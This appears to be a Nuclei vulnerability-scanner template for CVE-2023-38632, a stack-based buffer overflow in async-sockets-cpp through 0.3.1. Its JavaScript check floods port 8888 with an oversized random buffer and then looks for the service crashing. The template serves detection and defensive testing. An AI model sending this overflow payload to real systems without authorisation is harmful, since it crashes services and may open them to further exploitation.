id: CVE-2023-38632
info:
  author: dwisiswant0
  description: 'async-sockets-cpp through 0.3.1 has a stack-based buffer overflow

    in tcpsocket.hpp when processing malformed TCP packets.

    '
  name: CVE-2023-38632
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-38632
  - https://github.com/eminfedar/async-sockets-cpp/issues/31
  severity: critical
javascript:
- args:
    host: '{{Host}}'
    payload: '{{buffer}}'
    port: '8888'
  code: "const net = require('nuclei/net');\nlet ok = false,\n    err = false,\n \
    \   vuln = false;\nfor (let i = 0; i < 10; i++) {\n  try {\n    let conn = net.Open('tcp',\
    \ `${host}:${port}`);\n    conn.Send(payload);\n    let data = conn.RecvString(3);\n\
    \    ok = data === \"OK!\";\n    conn.Close();\n  } catch(e) {\n    err = /connection\
    \ (refused|reset by peer)/.test(e.value);\n    if (err && i > 0) break;\n  }\n\
    }\nvuln = ok && err;\n"
  matchers:
  - condition: and
    dsl:
    - success && response
    type: dsl
  pre-condition: isPortOpen(host, port, 10);
variables:
  buffer: '{{repeat(to_upper(rand_text_alpha(1)), rand_int(10000, 10999))}}'
